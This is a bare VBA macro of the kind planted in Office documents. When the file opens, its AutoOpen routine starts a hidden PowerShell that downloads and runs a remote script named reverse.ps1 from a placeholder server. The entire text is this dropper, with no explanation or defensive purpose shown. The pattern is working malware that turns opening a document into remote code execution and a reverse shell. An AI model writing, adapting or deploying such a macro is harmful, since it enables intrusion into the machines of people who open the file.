Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c powershell -NoP -W Hidden -C ""IEX(New-Object Net.WebClient).DownloadString('http://your-server/reverse.ps1')"""
End Sub
